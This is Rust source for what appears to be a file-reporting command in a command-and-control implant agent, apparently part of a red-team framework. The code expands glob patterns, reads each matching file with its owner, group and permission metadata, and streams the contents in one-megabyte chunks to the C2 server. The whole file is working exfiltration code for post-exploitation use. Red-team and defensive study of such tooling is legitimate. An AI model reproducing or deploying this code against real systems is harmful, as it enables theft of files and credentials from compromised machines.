use alloc::format;
use alloc::string::{String, ToString};
use alloc::sync::Arc;
use alloc::vec;
use eldritch_agent::{Agent, Context};
use pb::c2::report_file_request;
use pb::{c2, eldritch};
use std::io::Read;
use std::sync::Mutex;

#[cfg(unix)]
fn get_file_metadata_fields(metadata: &std::fs::Metadata) -> (String, String, String) {
    use nix::unistd::{Gid, Group, Uid, User};
    use std::os::unix::fs::MetadataExt;

    let mode = metadata.mode();
    let permissions = format!("{:o}", mode & 0o7777);

    let uid = metadata.uid();
    let owner = User::from_uid(Uid::from_raw(uid))
        .ok()
        .flatten()
        .map(|u| u.name)
        .unwrap_or_else(|| uid.to_string());

    let gid = metadata.gid();
    let group = Group::from_gid(Gid::from_raw(gid))
        .ok()
        .flatten()
        .map(|g| g.name)
        .unwrap_or_else(|| gid.to_string());

    (permissions, owner, group)
}

#[cfg(windows)]
fn get_file_metadata_fields(_metadata: &std::fs::Metadata) -> (String, String, String) {
    (String::new(), String::new(), String::new())
}

fn resolve_paths(path: &str) -> Result<alloc::vec::Vec<std::path::PathBuf>, String> {
    if path.contains('*') || path.contains('?') || path.contains('[') {
        let mut paths = vec![];
        for entry in glob::glob(path).map_err(|e| format!("Invalid glob pattern: {e}"))? {
            match entry {
                Ok(p) => paths.push(p),
                Err(e) => return Err(format!("Glob error: {e}")),
            }
        }
        if paths.is_empty() {
            return Err(format!("No files matched pattern: {path}"));
        }
        Ok(paths)
    } else {
        Ok(vec![std::path::PathBuf::from(path)])
    }
}

pub fn file(agent: Arc<dyn Agent>, context: Context, path: String) -> Result<(), String> {
    let resolved_paths = resolve_paths(&path)?;

    let context_val = match context {
        Context::Task(tc) => Some(report_file_request::Context::TaskContext(tc.clone())),
        Context::ShellTask(stc) => {
            Some(report_file_request::Context::ShellTaskContext(stc.clone()))
        }
    };

    let mut overall_error = None;

    for p in resolved_paths {
        if p.is_dir() {
            continue; // Can't report directories directly, skip or error. Let's skip.
        }

        let path_clone = p.to_string_lossy().to_string();
        let error = Arc::new(Mutex::new(None));
        let error_clone = error.clone();

        let context_val_clone = context_val.clone();

        let (tx, rx) = std::sync::mpsc::sync_channel(1);

        std::thread::spawn(move || {
            let file_res = std::fs::File::open(&path_clone).map_err(|e| e.to_string());
            match file_res {
                Ok(mut file) => {
                    let fs_metadata = std::fs::metadata(&path_clone).ok();
                    let (permissions, owner, group) = fs_metadata
                        .as_ref()
                        .map(get_file_metadata_fields)
                        .unwrap_or_default();

                    let mut metadata_sent = false;
                    let chunk_size = 1024 * 1024; // 1MB
                    let mut buffer = vec![0; chunk_size];

                    loop {
                        match file.read(&mut buffer) {
                            Ok(0) => break, // EOF
                            Ok(n) => {
                                let chunk_data = buffer[..n].to_vec();

                                let metadata = if !metadata_sent {
                                    metadata_sent = true;
                                    Some(eldritch::FileMetadata {
                                        path: path_clone.clone(),
                                        permissions: permissions.clone(),
                                        owner: owner.clone(),
                                        group: group.clone(),
                                        ..Default::default()
                                    })
                                } else {
                                    None
                                };

                                let file_msg = eldritch::File {
                                    metadata,
                                    chunk: chunk_data,
                                };

                                let req = c2::ReportFileRequest {
                                    context: context_val_clone.clone(),
                                    chunk: Some(file_msg),
                                    kind: c2::ReportFileKind::Ondisk as i32,
                                };

                                if tx.send(req).is_err() {
                                    break;
                                }
                            }
                            Err(e) => {
                                *error_clone.lock().unwrap() = Some(e.to_string());
                                break;
                            }
                        }
                    }
                }
                Err(e) => {
                    *error_clone.lock().unwrap() = Some(e);
                }
            }
        });

        // We report each file synchronously in the loop
        if let Err(e) = agent.report_file(rx) {
            overall_error = Some(e.to_string());
            break;
        }

        if let Some(e) = error.lock().unwrap().as_ref() {
            overall_error = Some(e.clone());
            break;
        }
    }

    if let Some(e) = overall_error {
        return Err(e);
    }

    Ok(())
}
